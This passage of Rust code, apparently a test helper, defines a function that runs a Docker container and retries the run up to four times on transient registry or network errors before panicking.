    .any(|needle| normalized.contains(needle))
}

fn run_container(args: &[&str]) -> DockerContainer {
    const MAX_ATTEMPTS: usize = 4;

    for attempt in 1..=MAX_ATTEMPTS {
        let output = Command::new("docker")
            .args(args)
            .output()
            .expect("docker run should execute");
        if output.status.success() {
            let id = String::from_utf8(output.stdout)
                .expect("container id utf8")
                .trim()
                .to_string();
            return DockerContainer { id };
        }

        let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
        if attempt < MAX_ATTEMPTS && is_retryable_docker_run_error(&stderr) {
            eprintln!(
                "docker run attempt {attempt}/{MAX_ATTEMPTS} failed with a transient registry/network error; retrying: {stderr}"
            );
            std::thread::sleep(Duration::from_millis(750 * attempt as u64));
            continue;
        }

        panic!("docker run failed after {attempt} attempt(s): {stderr}");
    }

    unreachable!("docker run should return or panic");
}

